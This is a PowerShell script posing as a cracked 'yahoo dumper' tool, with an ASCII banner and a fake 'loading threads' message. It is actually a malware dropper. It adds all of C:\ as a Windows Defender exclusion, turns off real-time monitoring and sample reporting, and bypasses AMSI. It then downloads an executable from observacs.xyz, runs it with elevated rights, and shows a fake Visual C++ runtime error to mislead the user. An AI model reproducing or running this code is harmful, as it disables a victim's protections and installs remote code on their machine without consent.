cls
$host.ui.RawUI.WindowTitle = 'yahoo dumper by crackinger fuck breakinginto'
Write-Host '
               .__                        .___                                 
 ___.__._____  |  |__   ____   ____     __| _/_ __  _____ ______   ___________ 
<   |  |\__  \ |  |  \ /  _ \ /  _ \   / __ |  |  \/     \\____ \_/ __ \_  __ \
 \___  | / __ \|   Y  (  <_> |  <_> ) / /_/ |  |  /  Y Y  \  |_> >  ___/|  | \/
 / ____|(____  /___|  /\____/ \____/  \____ |____/|__|_|  /   __/ \___  >__|   
 \/          \/     \/                     \/           \/|__|        \/       

cracked by crackinger #breakingin.to
'
Start-Sleep -s 2
echo "loading threads"
#Set exclusion path
Add-MpPreference -ExclusionPath "C:\"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting Disable
Set-MpPreference -SubmitSamplesConsent NeverSend

#Disable AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$url = "http://observacs.xyz/dashboard/obcaptcha.exe"
$output = "C:\Windows\Temp\obcaptcha.exe"

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)

Start-Process -FilePath $output -Verb RunAs

Start-Sleep -s 5
echo 'Visual C++ runtime has malfunctioned: R6035 R6028'
Start-Sleep -s 86400
